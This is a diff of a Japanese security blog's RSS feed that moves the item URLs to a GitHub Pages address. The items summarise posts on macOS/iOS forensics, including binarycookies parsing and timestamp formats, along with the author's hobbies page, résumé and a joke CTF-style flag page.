       <title>binarycookiesファイル解析ツールbincookie</title>
-      <link>https://alicemacs.com/blog/analyzing_binary_cookie/</link>
+      <link>https://owlinux1000.github.io/blog/blog/analyzing_binary_cookie/</link>
       <pubDate>Wed, 06 Mar 2019 23:10:49 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/analyzing_binary_cookie/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/analyzing_binary_cookie/</guid>
       <description>はじめに iOSやMacのフォレンジックでは、アーティファクトの1つとしてCookie情報を利用します。macOSでは、/User/ユーザ名/Library/Cookies/Cookies.binarycookies に存在します。しかしながら、本ファイルは拡張子からもわかるようにバイナリ形式になっています。そこで、本記事ではこのバイナリファイルを解析するツールをご紹介します。
 bincookie bincookie
 拙作のGolangで実装された解析ツールです。goユーザならgo getで入りますし、Releaseからバイナリのダウンロードもできます。
@@ -243,10 +243,10 @@ $ bincookie /Users/ユーザ名/Library/Cookies/com.apple.iTunes.binarycookies #
     
     <item>
       <title>iOSデバイスフォレンジック入門</title>
-      <link>https://alicemacs.com/blog/an_introduction_of_ios_forensics/</link>
+      <link>https://owlinux1000.github.io/blog/blog/an_introduction_of_ios_forensics/</link>
       <pubDate>Thu, 28 Feb 2019 21:00:00 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/an_introduction_of_ios_forensics/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/an_introduction_of_ios_forensics/</guid>
       <description>はじめに 本記事では、iOSフォレンジックをやったことない人向けに基本的な情報をまとめてみました。取っ掛かりとしては簡単に読める内容だと思います。主にiOSデバイスのバックアップデータやその解析ツールについてご紹介しています。
 準備 本記事では主に以下のデバイスやソフトウェアを使って検証しています。当該デバイスやバージョンでない場合同じ結果や解釈にならない可能性もありますのでご了承ください。
  iPad mini4 (iOS 12.1.1 非Jailbreak) MacBookPro (High Sierra 10.13.6) iTunes (12.8.3)  iOS 概要 iOSは、iPhoneやiPad、Apple Watch等で利用されているOSです。iOSは大きく分けて、以下の4つのシステムから構成されています。
@@ -262,10 +262,10 @@ Info.plistは、主にバックアップ対象のデバイス情報について�
     
     <item>
       <title>フォレンジックのためのシステム時刻入門</title>
-      <link>https://alicemacs.com/blog/system_time_for_forensics/</link>
+      <link>https://owlinux1000.github.io/blog/blog/system_time_for_forensics/</link>
       <pubDate>Sat, 23 Feb 2019 20:37:24 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/system_time_for_forensics/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/system_time_for_forensics/</guid>
       <description>はじめに フォレンジックなどをやっていると様々な時刻形式と直面することがあります。いざ調べてみると時刻形式は、プラットフォームによって異なる場合が多いことに気づきました。時刻の情報はタイムライン作成では、とても重要な要因となってくるので、適切に時刻を解釈することが必要です。本記事では、よく見る3つの時刻表記についてご紹介します。
 UNIX time  UNIX timeはDFIRだけに限らず多くの場面でよく見かける時刻形式の1つです。UTC（協定世界時）の1970年1月1日0時0分0秒からの経過秒数で表す時刻形式です。主要なプログラミング言語の代表的な時刻を扱うライブラリなどでは、UNIX timeをサポートしています。例えばRubyでは以下の様に、UNIX timeを扱うことができます。  require &amp;#39;time&amp;#39; JST_OFFSET = 3600 * 9 puts Time.parse(&amp;#34;1970-01-01 00:00:00&amp;#34;).to_i + JST_OFFSET #=&amp;gt; 0 puts Time.at(0) #=&amp;gt; 1970-01-01 09:00:00 +0900 Apple Cocoa Core Data timestamp  Apple Cocoa Core Data timestampは、主にMac OSやiOSで見かける時刻形式です。Cocoaとは、macOS用のフレームワークです。また、Mac absolute timeと表記されることもあります。本時刻形式は、UTCの2001年1月1日0時0分0秒からの経過秒数で表す時刻形式です。UNIX timeとの差分は、978307200なので、これを考慮すればUNIX timeからすぐ算出することができます。  WebKit/Chrome time  WebKit/Chrome timeは、Google Chrome、OperaやSafariなどのデータで使われている時刻形式です。本時刻形式は、UTCの1601年1月1日0時0分0秒からの経過マイクロ秒で表す時刻形式です。UNIX timeなどと異なりマイクロ秒なので値が大きいという特徴があります。  便利なツールやサイト 以下の2つは、システム時刻変換をする際に、使いやすかったツールです。
  Epoch Converter  本記事で説明した時刻形式などは概ねカバーしているツールです   DCode  Epoch Converterと同様の機能を有しているWindowsアプリケーション    参考文献  Practical Mobile Forensics - Third Edition  </description>
@@ -273,10 +273,10 @@ UNIX time  UNIX timeはDFIRだけに限らず多くの場面でよく見かけ�
     
     <item>
       <title>新年なのでHugo でGitHub Pages にデプロイ</title>
-      <link>https://alicemacs.com/blog/helloworld/</link>
+      <link>https://owlinux1000.github.io/blog/blog/helloworld/</link>
       <pubDate>Wed, 02 Jan 2019 22:27:14 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/helloworld/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/helloworld/</guid>
       <description>あけましておめでとうございます。本年もよろしくお願いいたします。
 新年なので、Hugo で技術ブログを作成してみました。私ははてなブログやMedium などいろいろサイトを持っているわけですが、このブログには自分の備忘録的なことを書いて行こうと思います。
 1. Hugo のインストールと事前準備 まずはHugo をインストールし、使いたいテーマ(今回はoneというテーマ)をsubmoduleとして取り込む。今回は、GitHub にblog というリポジトリを作成(アクセスする際には、https://owlinux1000.github.io/blog/) して、GitHubの設定で masterブランチのdocs/ を公開対象として設定する。
@@ -287,29 +287,29 @@ $ hugo new posts/helloworld # この記事 $ emacs content/posts/helloworld.md #
     
     <item>
       <title></title>
-      <link>https://alicemacs.com/hobbies/</link>
+      <link>https://owlinux1000.github.io/blog/hobbies/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://alicemacs.com/hobbies/</guid>
+      <guid>https://owlinux1000.github.io/blog/hobbies/</guid>
       <description>Hobbies   カラオケ  ボカロ、歌い手、バンド、V系バンド 誰とでも行けるので気軽に誘ってください   茶道  たまにお家で点てたりする   美術館巡り  西洋絵画が専門   洋画鑑賞  Filmarksで視聴履歴を管理してます サスペンス、ホラー、サイコスリラーあたりが好き   パズル 水泳  最近はできてない   料理  パスタ料理に夢中   ゲーム  Nintendo Switch (SW-1615-8934-9882) PS4 美少女ゲーム    </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://alicemacs.com/resume/</link>
+      <link>https://owlinux1000.github.io/blog/resume/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://alicemacs.com/resume/</guid>
+      <guid>https://owlinux1000.github.io/blog/resume/</guid>
       <description>Résumé  Here is my unofficial résumé. But, if you are interested in me or have a question about me, feel free to contact me with email!
 Personal Data  Name: Chihiro Hasegawa Birthday: 1996/03/28 Languages: Japanese, English Resides: Kanagawa, Japan Email: encry1024[at]gmail.com  Objective  Research and Development for  Threat Intelligence (Exploit, Malware)   Penetration Tester  Experience and Skills  Security engineer  Malware analysis Research threat intelligence Incident Response Digital Forensics   Server and network administrator  Network Appliance(Cisco, Juniper, IIJ) Provisoning (Vagrant, Ansible, Docker) Monitoring system (Zabbix, Prometheus, SNMP) Testing servers (Serverspec, Goss)   Development  Programming (C, Ruby, Golang, Assembly, Python, JavaScript) Git, GitHub Exploit Development for Penetration Test    Activites  Competiton event staff  Cpaw CTF Tokyowesterns CTF SECCON Beginners Cpaw AI Competition 1st, 2nd   Participation  Security Camp (participation and tutor) SECCON 2016 Osaka SECCON 2016 Final A lot of online CTFs    Certifications  National Certifications  Information Technology Passport Examination Fundamental Information Technology Engineer Examination Applied Information Technology Engineer Examination Registered Information Security Specialist Examination Network Specialist Examination   International Certifications  GIAC Reverse Engineering Malware(GREM) GIAC Exploit Researcher and Advanced Penetration Tester(GXPN)    Education  Apr 2014 – Mar 2018 Hosei University, Japan Bachelor of Engineer  Publications  One-dimensional convolutional neural networks for Android malware detection セキュリティコンテストのためのCTF問題集 (co-author)  </description>
     </item>
     
     <item>
       <title></title>
-      <link>https://alicemacs.com/secret/</link>
+      <link>https://owlinux1000.github.io/blog/secret/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://alicemacs.com/secret/</guid>
+      <guid>https://owlinux1000.github.io/blog/secret/</guid>
       <description>You got a FLAG: FLAG{Thank_you_for_visiting_my_website!}</description>
     </item>
     
